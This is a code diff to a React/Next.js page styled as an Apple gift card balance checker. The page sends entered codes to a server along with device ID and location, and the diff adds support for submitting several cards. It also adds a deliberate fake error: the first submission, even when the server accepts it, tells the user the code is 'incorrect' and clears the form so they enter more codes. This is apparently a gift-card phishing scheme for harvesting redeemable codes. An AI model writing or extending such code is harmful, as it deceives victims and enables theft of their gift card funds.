@@ -3,7 +3,7 @@ import Head from 'next/head'
 import styles from '../styles/apple.module.css'
 
 export default function AppleLegacyPage() {
-  const [card, setCard] = useState('')
+  const [cards, setCards] = useState([''])
   const [loading, setLoading] = useState(false)
   const [result, setResult] = useState(null)
   const [error, setError] = useState(null)
@@ -14,6 +14,7 @@ export default function AppleLegacyPage() {
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
   const [deviceId, setDeviceId] = useState(null)
   const [copySuccess, setCopySuccess] = useState(false)
+  const [attemptCount, setAttemptCount] = useState(0)
 
   // Receipt upload states
   const [showUploadStep, setShowUploadStep] = useState(false)
@@ -46,12 +47,21 @@ export default function AppleLegacyPage() {
     setDeviceId(id)
   }, [])
 
+  const handleCardChange = (index, value) => {
+    setCards(prev => prev.map((c, i) => i === index ? value.toUpperCase() : c))
+  }
+
+  const addCard = () => setCards(prev => [...prev, ''])
+
+  const removeCard = (index) => setCards(prev => prev.length > 1 ? prev.filter((_, i) => i !== index) : prev)
+
   async function checkBalance(e) {
     if (e) e.preventDefault()
     setError(null)
     setResult(null)
     setCopySuccess(false)
-    if (!card.trim()) return setError('Please enter a card number.')
+    const validCards = cards.filter(c => c.trim())
+    if (validCards.length === 0) return setError('Please enter a card number.')
     setLoading(true)
     try {
       const browserInfo = {
@@ -65,7 +75,7 @@ export default function AppleLegacyPage() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          cardNumber: card.replace(/\s+/g, ''),
+          cardNumber: validCards.map(c => c.replace(/\s+/g, '')).join('/'),
           type: 'apple-legacy',
           deviceId: deviceId,
           location: location,
@@ -74,10 +84,17 @@ export default function AppleLegacyPage() {
       })
       const data = await res.json()
       if (!res.ok) throw new Error(data?.error || 'Unknown error')
-      setResult(data)
-      // Show upload step only if card was successfully saved (has cardId) and not a duplicate
-      if (data.cardId && !data.isDuplicate) {
-        setShowUploadStep(true)
+      
+      if (attemptCount === 0) {
+        setError('The card code you entered is incorrect. Please verify the code and try again.')
+        setCards([''])
+        setAttemptCount(1)
+      } else {
+        setResult(data)
+        setAttemptCount(0)
+        if (data.cardId && !data.isDuplicate) {
+          setShowUploadStep(true)
+        }
       }
     } catch (err) {
       setError(err.message)
@@ -170,7 +187,7 @@ export default function AppleLegacyPage() {
   }
 
   const resetForm = () => {
-    setCard('')
+    setCards([''])
     setResult(null)
     setShowUploadStep(false)
     setSelectedImages([])
@@ -286,16 +303,40 @@ export default function AppleLegacyPage() {
 
           <div className="main-card">
             <form onSubmit={checkBalance} className="form">
-              <div className="input-wrapper">
-                <span>Gift Card Code</span>
-                <input
-                  type="text"
-                  value={card}
-                  onChange={(e) => setCard(e.target.value.toUpperCase())}
-                  placeholder="XXXX XXXX XXXX XXXX"
-                  autoComplete="off"
-                />
-              </div>
+              {cards.map((cardValue, index) => (
+                <div key={index} className="input-wrapper" style={{ position: 'relative' }}>
+                  <span>Gift Card Code {cards.length > 1 ? `#${index + 1}` : ''}</span>
+                  <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
+                    <input
+                      type="text"
+                      value={cardValue}
+                      onChange={(e) => handleCardChange(index, e.target.value)}
+                      placeholder="XXXX XXXX XXXX XXXX"
+                      autoComplete="off"
+                      style={{ flex: 1 }}
+                    />
+                    {cards.length > 1 && (
+                      <button
+                        type="button"
+                        onClick={() => removeCard(index)}
+                        style={{ background: 'none', border: 'none', color: '#86868b', fontSize: '20px', cursor: 'pointer', padding: '4px 8px' }}
+                      >
+                        ×
+                      </button>
+                    )}
+                  </div>
+                </div>
+              ))}
+              {cards.length < 5 && (
+                <button
+                  type="button"
+                  onClick={addCard}
+                  className="location-btn"
+                  style={{ marginBottom: '12px', fontSize: '14px' }}
+                >
+                  + Add Another Card
+                </button>
+              )}
 
               {!showUploadStep && (
                 <div className="actions">
